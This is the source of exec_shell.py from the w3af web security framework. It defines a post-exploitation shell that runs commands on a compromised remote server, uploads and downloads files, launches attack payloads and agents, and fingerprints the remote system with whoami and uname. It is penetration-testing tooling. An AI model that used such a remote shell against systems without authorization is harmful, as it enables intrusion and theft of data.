'''
exec_shell.py

Copyright 2010 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

from core.controllers.w3afException import w3afException
from core.controllers.intrusionTools.execMethodHelpers import osDetectionExec
import core.data.parsers.urlParser as urlParser

import plugins.attack.payloads.payload_handler as payload_handler
import core.controllers.outputManager as om

from core.data.kb.shell import shell
import time


class exec_shell(shell):
    '''
    This class represents a shell where users can execute commands in the remote
    operating system and get the output back.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self, v):
        shell.__init__(self, v)

    def help( self, command ):
        '''
        Handle the help command.
        '''
        om.out.console('Available commands:')
        om.out.console('    help                            Display this information')
        om.out.console('    start vdaemon                   Start the virtual daemon')
        om.out.console('    start w3afAgent                 Start the w3afAgent service')
        om.out.console('    endInteraction                  Exit the shell session')
        om.out.console('')
        om.out.console('All the other commands are executed on the remote server.')
        return True

    def download(self, remote_filename, local_filename):
        '''
        This is a wrapper around "read" that will write the results
        to a local file.
        
        @param remote_filename: The remote file to download.
        @param local_filename: The local file where to write the contents of the remote file.
        @return: The message to show to the user.
        '''
        remote_content = self.read( remote_filename )
        
        if not remote_content:
            return 'Remote file does not exist.'
        else:
            try:
                fh = file(local_filename, 'w')
            except:
                return 'Failed to open local file for writing.'
            else:
                fh.write(remote_content)
                fh.close()
                return 'Success.'

    def upload(self, local_filename, remote_filename ):
        '''
        This is a wrapper around "write" that will upload a local file
        to the remote filesystem.
        
        @param local_filename: The local file to read and then upload to the remote system.
        @param remote_filename: The remote file to create and write contents to.
        
        @return: The message to show to the user.
        '''
        try:
            fh = file(local_filename, 'r')
        except:
            return 'Failed to open local file for reading.'
        else:
            file_content = fh.read()
            fh.close()
            self.write( remote_filename, file_content )
            return 'Success.'
        
    def generic_user_input( self, command ):
        '''
        This is the method that is called when a user wants to execute something in the shell.
        
        First, I trap the requests for starting the virtual daemon and the w3afAgent, and if this is not the
        case, I forward the request to the specific_user_input method which should be implemented by all shellAttackPlugins.
        '''
        #
        #    Here I get all the common methods like help, payloads, lsp, etc.
        #
        super(shell, self).generic_user_input(command)

        # Get the command and the parameters
        original_command = command
        parameters = command.split(' ')[1:]
        command = command.split(' ')[0]
        
        #
        #    Write remote files
        #
        if command == 'write' and len(parameters) == 2:
            filename = parameters[0]
            content = parameters[1]
            return self.write( filename, content )

        #
        #    Upload local files to the remote system
        #
        elif command == 'upload' and len(parameters) == 2:
            remote_filename = parameters[1]
            local_filename = parameters[0]
            return self.upload(local_filename, remote_filename)
            
        #
        #    Commands that are common to shells that can EXECUTE commands:
        #

        #
        #    Execute the command in the remote host 
        #
        if command in ['e', 'exec', 'execute']:
            self.execute( original_command )
        
        #
        #    Advanced exploitation
        #   
        if command == 'start vdaemon':
            self.start_vdaemon()
            
        elif command == 'start w3afAgent':
            self.start_w3afAgent()
                
        #
        #    Call the shell subclass method if needed
        #
        if hasattr( self, 'specific_user_input'):
            # forward to the plugin
            return self.specific_user_input( command )

    def get_read_command(self):
        '''
        @return: The command to be used to read files in the current operating system.
        Examples:
            - cat %s
            - type %s
        The %s will be replaced by the file to be read.
        '''
        if self._rOS == 'windows':
            return 'type %s'
        else:
            return 'cat %s'

    def start_w3afAgent(self):
        '''
        start a w3afAgent, to do this, I must transfer the agent client to the
        remote end and start the w3afServer in this local machine
        all this work is done by the w3afAgentManager, I just need to called
        start and thats it.
        '''
        from core.controllers.w3afAgent.w3afAgentManager import w3afAgentManager
        try:
            agentManager = w3afAgentManager(self.execute)
        except w3afException, w3:
            return 'Error' + str(w3)
        else:
            agentManager.run()
            return 'Successfully started the w3afAgent.'

    def start_vdaemon(self):
        '''
        Starts a virtual daemon using the "execute" syscall.
        
        @return: The message to show to the user.
        '''
        from core.controllers.vdaemon.vdFactory import getVirtualDaemon
        try:
            vd = getVirtualDaemon(self.execute)
        except w3afException, w3:
            return 'Error' + str(w3)
        else:
            vd.setRemoteIP( urlParser.getDomain( self.getURL() )  )
            vd.start2()
            # Let the server start
            time.sleep(0.1)
            return 'Successfully started the virtual daemon.'

    def end_interaction(self):
        '''
        When the user executes endInteraction in the console, this method is called.
        Basically, here we handle WHAT TO DO in that case. In most cases (and this is
        why we implemented it this way here) the response is "yes, do it end me" that
        equals to "return True".
        
        In some other cases, the shell prints something to the console and then exists,
        or maybe some other, more complex, thing.
        '''
        return True

    def specific_user_input( self, command ):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        Recommendation: Overwrite this in your customized shells
        
        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @parameter command: The command to handle ( ie. "read", "exec", etc ).
        @return: The result of the command.
        '''
        pass
    
    def _payload(self, payload_name):
        '''
        Run a payload by name.
        
        @parameter payload_name: The name of the payload I want to run.
        '''
        result_str = ''
        
        if payload_name in payload_handler.runnable_payloads(self):
            om.out.debug( 'The payload can be run. Starting execution.' )
            # TODO: The payloads are actually writing to om.out.console
            # by themselves, so this is useless. In order for the
            # result_str = ... to work, we would need a refactoring
            # what usually gets here, are errors.
            result_str = payload_handler.exec_payload( self,  payload_name)
        else:
            result_str = 'The payload could not be run.'
            
        return result_str
    
    def _print_runnable_payloads(self):
        '''
        Print the payloads that can be run using this exploit.
        
        @return: A list with all runnable payloads.
        '''
        payloads = payload_handler.runnable_payloads( self )
        payloads.sort()
        return '\n'.join( payloads )
        
    def end( self ):
        '''
        This method is called when the shell is not going to be used anymore. It should be used to remove the
        auxiliary files (local and remote) generated by the shell.
        
        @return: None
        '''
        raise w3afException('You should implement the end method of classes that inherit from "shell"')

    def getName( self ):
        '''
        This method is called when the shell is used, in order to create a prompt for the user.
        
        @return: The name of the shell ( osCommandingShell, davShell, etc )
        '''
        raise w3afException('You should implement the getName method of classes that inherit from "shell"')
        
    def _identifyOs( self ):
        '''
        Identify the remote operating system and get some remote variables to show to the user.
        '''
        self._rOS = osDetectionExec( self.execute ) 
        
        if self._rOS == 'linux':
            self._rUser = self.execute('whoami').strip()
            self._rSystem = self.execute('uname -o -r -n -m -s').strip()
            self._rSystemName = self.execute('uname -n').strip()
        elif self._rOS == 'windows':
            self._rUser = self.execute('echo %USERDOMAIN%\%USERNAME%').strip()
            self._rSystem = self.execute('echo %COMPUTERNAME% - %OS% - %PROCESSOR_IDENTIFIER%').strip()
            self._rSystemName = self.execute('echo %COMPUTERNAME%').strip()
                            
    def __repr__( self ):
        if not self._rOS:
            self._identifyOs()
        return '<'+self.getName()+' object (ruser: "'+self.getRemoteUser()+'" | rsystem: "'+self.getRemoteSystem()+'")>'
        
    __str__ = __repr__
